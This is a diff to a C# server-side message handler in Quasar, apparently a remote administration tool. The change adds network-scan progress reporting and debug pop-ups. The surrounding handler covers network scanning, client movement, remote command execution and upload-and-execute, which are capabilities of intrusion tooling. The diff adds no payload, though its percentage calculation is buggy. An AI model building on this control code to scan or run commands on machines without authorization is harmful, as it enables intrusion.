@@ -38,7 +38,8 @@ namespace Quasar.Server.Messages
         public override bool CanExecute(IMessage message) => message is DoNetworkScanResponse ||
                                                              message is DoClientMovementResponse ||
                                                              message is DoRemoteCommandExecuteResponse ||
-                                                             message is DoUploadAndExecuteResponse;
+                                                             message is DoUploadAndExecuteResponse ||
+                                                             message is NetworkScanProgress;
 
         public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);
 
@@ -63,12 +64,17 @@ namespace Quasar.Server.Messages
                 case DoUploadAndExecuteResponse uploadResp:
                     Execute(sender, uploadResp);
                     break;
+                case NetworkScanProgress progResp:
+                    Execute(sender, progResp);
+                    break;
             }
         }
 
         public void RefreshEntities()
         {
+            MessageBox.Show("Requesting Network Scan...");
             _client.Send(new DoNetworkScan());
+            MessageBox.Show("Requested!");
         }
 
         public void MoveToEntity(NetworkEntity entity)
@@ -105,5 +111,12 @@ namespace Quasar.Server.Messages
         {
             MessageBox.Show("Received Upload and Execute Response!");
         }
+
+        private void Execute(ISender client, NetworkScanProgress message)
+        {
+            MessageBox.Show($"Received Progress Report: {message.InterfaceIndex} / {message.Interfaces} => {message.CurrentAddress} / {message.Addresses} : {Math.Round((double)(message.CurrentAddress / message.Addresses), 4)}%");
+        }
+
+        // Ok, we need to allow the server to select what interfaces to scan, combo box maybe?
     }
 }
